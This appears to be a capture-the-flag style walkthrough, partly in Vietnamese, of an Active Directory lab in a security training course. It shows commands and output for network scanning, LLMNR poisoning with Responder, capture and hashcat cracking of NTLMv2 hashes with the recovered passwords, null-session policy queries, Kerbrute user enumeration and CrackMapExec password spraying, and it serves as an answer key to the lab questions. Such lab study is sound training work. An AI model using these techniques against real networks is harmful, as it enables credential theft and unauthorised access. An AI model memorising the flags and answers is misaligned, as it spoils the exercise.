# External Recon and Enumeration Principles

#### Questions

+ 0  While looking at inlanefreights public records; A flag can be seen. Find the flag and submit it. ( format == HTB{******} )

```zsh
dig txt inlanefreight.com
```

![](images/1.png)


# Initial Enumeration of the Domain

#### Questions

 SSH to  with user "htb-student" and password "HTB_@cademy_stdnt!"

+ 0  From your scans, what is the "commonName" of host 172.16.5.5 ?

```zsh
sudo nmap -A -T 4 --min-rate 3000 172.16.5.5
```

![](images/2.png)
+ 0  What host is running "Microsoft SQL Server 2019 15.00.2000.00"? (IP address, not Resolved name)

```zsh
sudo nmap -A -T 4 --min-rate 3000 172.16.5.130
```

Để ý thông qua các dịch vụ khác ví dụ như SMB, ta hoàn toàn có thể xác định được phiên bản hệ điều hành của mục tiêu:

```zsh
ost script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: ACADEMY-EA-FILE, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b0:65:49 (VMware)
| smb2-time: 
|   date: 2025-05-22T16:58:47
|_  start_date: N/A
| ms-sql-info: 
|   172.16.5.130:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433

TRACEROUTE
HOP RTT     ADDRESS
1   0.92 ms 172.16.5.130
```
# LLMNR/NBT-NS Poisoning - from Linux
#### Questions

Answer the question(s) below to complete this Section and earn cubes!

Target(s): 10.129.84.172 (ACADEMY-EA-ATTACK01)   

 SSH to 10.129.84.172 (ACADEMY-EA-ATTACK01) with user "htb-student" and password "HTB_@cademy_stdnt!"

+ 0  Run Responder and obtain a hash for a user account that starts with the letter b. Submit the account name as your answer.

Kiểm tra NIC bằng lệnh  ifconfig, để ý NIC nào đang nằm trong mạng private 172.16.5.0/23.

```zsh
sudo responder -I ens224
```

Username bắt đầu với chữ cái 'b' có lẽ là `backupagent`, chúng ta đã có hàm băm của anh ta.

```zsh
[SMB] NTLMv2-SSP Client   : 172.16.5.130
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\backupagent
[SMB] NTLMv2-SSP Hash     : backupagent::INLANEFREIGHT:23572c9987011615:02E3581082858BC1736E5E87C22CEB3B:010100000000000080DAFDB21ECBDB01AB9B519A7F52D0D400000000020008004C0059005600420001001E00570049004E002D003300530030003000520049003500440052003200480004003400570049004E002D00330053003000300052004900350044005200320048002E004C005900560042002E004C004F00430041004C00030014004C005900560042002E004C004F00430041004C00050014004C005900560042002E004C004F00430041004C000700080080DAFDB21ECBDB0106000400020000000800300030000000000000000000000000300000C93CB54D77D08E579F8FA227B7403C0C00D37D6915DA97ADDAC344866684E0FA0A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000   
```

+ 0  Crack the hash for the previous account and submit the cleartext password as your answer.

```zsh
hashcat -m 5600 backupagent_hash /usr/share/wordlists/rockyou.txt --show
BACKUPAGENT::INLANEFREIGHT:23572c9987011615:02e3581082858bc1736e5e87c22ceb3b:010100000000000080dafdb21ecbdb01ab9b519a7f52d0d400000000020008004c0059005600420001001e00570049004e002d003300530030003000520049003500440052003200480004003400570049004e002d00330053003000300052004900350044005200320048002e004c005900560042002e004c004f00430041004c00030014004c005900560042002e004c004f00430041004c00050014004c005900560042002e004c004f00430041004c000700080080dafdb21ecbdb0106000400020000000800300030000000000000000000000000300000c93cb54d77d08e579f8fa227b7403c0c00d37d6915da97addac344866684e0fa0a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e0035002e003200320035000000000000000000:h1backup55
```

+ 0  Run Responder and obtain an NTLMv2 hash for the user wley. Crack the hash using Hashcat and submit the user's password as your answer.

```zsh
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\wley
[SMB] NTLMv2-SSP Hash     : wley::INLANEFREIGHT:2dd7b9c6ef0621c9:A16D599B6E621ED7F4AFE7EF7FEABFAE:010100000000000080DAFDB21ECBDB01570442FC64E5BB3700000000020008004C0059005600420001001E00570049004E002D003300530030003000520049003500440052003200480004003400570049004E002D00330053003000300052004900350044005200320048002E004C005900560042002E004C004F00430041004C00030014004C005900560042002E004C004F00430041004C00050014004C005900560042002E004C004F00430041004C000700080080DAFDB21ECBDB0106000400020000000800300030000000000000000000000000300000C93CB54D77D08E579F8FA227B7403C0C00D37D6915DA97ADDAC344866684E0FA0A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000
```

```zsh
hashcat -m 5600 wley_ntlm2 /usr/share/wordlists/rockyou.txt --show
WLEY::INLANEFREIGHT:2dd7b9c6ef0621c9:a16d599b6e621ed7f4afe7ef7feabfae:010100000000000080dafdb21ecbdb01570442fc64e5bb3700000000020008004c0059005600420001001e00570049004e002d003300530030003000520049003500440052003200480004003400570049004e002d00330053003000300052004900350044005200320048002e004c005900560042002e004c004f00430041004c00030014004c005900560042002e004c004f00430041004c00050014004c005900560042002e004c004f00430041004c000700080080dafdb21ecbdb0106000400020000000800300030000000000000000000000000300000c93cb54d77d08e579f8fa227b7403c0c00d37d6915da97addac344866684e0fa0a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e0035002e003200320035000000000000000000:transporter@4
```

#### Questions

Answer the question(s) below to complete this Section and earn cubes!

Target(s): 10.129.63.80 (ACADEMY-EA-MS01)   

 RDP to 10.129.63.80 (ACADEMY-EA-MS01) with user "htb-student" and password "Academy_student_AD!"

+ 0  Run Inveigh and capture the NTLMv2 hash for the svc_qualys account. Crack and submit the cleartext password as the answer.

```zsh
xfreerdp3 /v:10.129.63.80 /u:htb-student /p:'Academy_student_AD!'
```

![](images/3.png)

![](images/4.png)

```zsh
hashcat -m 5600 svc_qualys_hash /usr/share/wordlists/rockyou.txt --show
SVC_QUALYS::INLANEFREIGHT:fbd25250c1cf01fc:a897d994b7336d08fdde792447277228:01010000000000002bcc657445cbdb01c3976282919e5a5c0000000002001a0049004e004c0041004e004500460052004500490047004800540001001e00410043004100440045004d0059002d00450041002d004d005300300031000400260049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c0003004600410043004100440045004d0059002d00450041002d004d005300300031002e0049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c000500260049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c00070008002bcc657445cbdb0106000400020000000800300030000000000000000000000000300000212a62e653617373c62fda0966078637ae053fc4dcf8d5810d6cc249634926450a001000000000000000000000000000000000000900200063006900660073002f003100370032002e00310036002e0035002e00320035000000000000000000:security#1
```
# Enumerating & Retrieving Password Policies

#### Questions

Answer the question(s) below to complete this Section and earn cubes!

Target(s): 10.129.200.73 (ACADEMY-EA-ATTACK01)   

 SSH to 10.129.200.73 (ACADEMY-EA-ATTACK01) with user "htb-student" and password "HTB_@cademy_stdnt!"

+ 0  What is the default Minimum password length when a new domain is created? (One number)

|Policy|Default Value|
|---|---|
|Enforce password history|24 days|
|Maximum password age|42 days|
|Minimum password age|1 day|
|Minimum password length|7|
|Password must meet complexity requirements|Enabled|
|Store passwords using reversible encryption|Disabled|
|Account lockout duration|Not set|
|Account lockout threshold|0|
|Reset account lockout counter after|Not set

+ 0  What is the minPwdLength set to in the INLANEFREIGHT.LOCAL domain? (One number)
```zsh
rpcclient -U "" -N 172.16.5.5

rpcclient $> querydominfo
Domain:         INLANEFREIGHT
Server:
Comment:
Total Users:    3509
Total Groups:   0
Total Aliases:  203
Sequence No:    1
Force Logoff:   -1
Domain Server State:    0x1
Server Role:    ROLE_DOMAIN_PDC
Unknown 3:      0x1

rpcclient $> getdompwinfo
min_password_length: 8
password_properties: 0x00000001
        DOMAIN_PASSWORD_COMPLEX
        
rpcclient $> 
```

# Password Spraying - Making a Target User List

#### Questions

Answer the question(s) below to complete this Section and earn cubes!

Target(s): 10.129.200.73 (ACADEMY-EA-ATTACK01)   

 SSH to 10.129.200.73 (ACADEMY-EA-ATTACK01) with user "htb-student" and password "HTB_@cademy_stdnt!"

+ 0  Enumerate valid usernames using Kerbrute and the wordlist located at /opt/jsmith.txt on the ATTACK01 host. How many valid usernames can we enumerate with just this wordlist from an unauthenticated standpoint?

```zsh
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt > valid-users

cat valid-users
```

![](images/5.png)

# Internal Password Spraying - from Linux

#### Questions

Answer the question(s) below to complete this Section and earn cubes!

Target(s): 10.129.200.73 (ACADEMY-EA-ATTACK01)   

 SSH to 10.129.200.73 (ACADEMY-EA-ATTACK01) with user "htb-student" and password "HTB_@cademy_stdnt!"

+ 0  Find the user account starting with the letter "s" that has the password Welcome1. Submit the username as your answer.

```zsh
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt > valid-users
```

Lọc ra các username có kí tự 's' ở đầu tên:

```zsh
cat valid-users | grep 'VALID' | cut -d' ' -f8 | grep '^s' | cut -d'@' -f1
sbrown
srosario
sinman
strent
sgage

cat valid-users | grep 'VALID' | cut -d' ' -f8 | grep '^s' | cut -d'@' -f1  > valid.txt
```

Tiến hành spray password

```zsh
sudo crackmapexec smb 172.16.5.5 -u valid.txt -p Welcome1 | grep +
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\sgage:Welcome1
```

